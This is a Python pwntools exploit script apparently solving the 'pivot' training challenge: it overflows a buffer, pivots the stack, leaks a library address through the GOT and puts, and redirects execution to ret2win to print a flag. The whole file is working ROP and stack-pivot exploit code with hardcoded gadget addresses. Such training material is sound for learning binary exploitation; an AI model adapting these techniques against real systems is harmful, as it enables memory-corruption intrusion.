#!/usr/bin/env python3

from pwn import *

exe = ELF("pivot_patched")
libc = ELF("libpivot.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 40
    footoff = 0x96a
    rtwoff = 0xa81
    footgot = 0x601040
    footplt = 0x400720
    putsplt = 0x4006e0
    pivot = 0x4009bd
    poprax = 0x4009bb
    poprdi = 0x400a33
    main = 0x400847

    r.recvuntil('pivot: ')
    pivotadd = int(r.recvline(), 16)

    payload = flat(footplt, poprdi, footgot, putsplt, main)
    r.sendline(payload)

    payload = flat(b'A'*offset, poprax, pivotadd, pivot)
    r.sendlineafter(b'>', payload)

    r.recvuntil('libpivot\n')
    leakstuff = r.recv()
    footleak = unpack(leakstuff[:6].ljust(8, b'\x00'))
    libcbase = footleak - footoff
    rtwadd = libcbase + rtwoff

    payload = flat(b'A'*offset, rtwadd)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
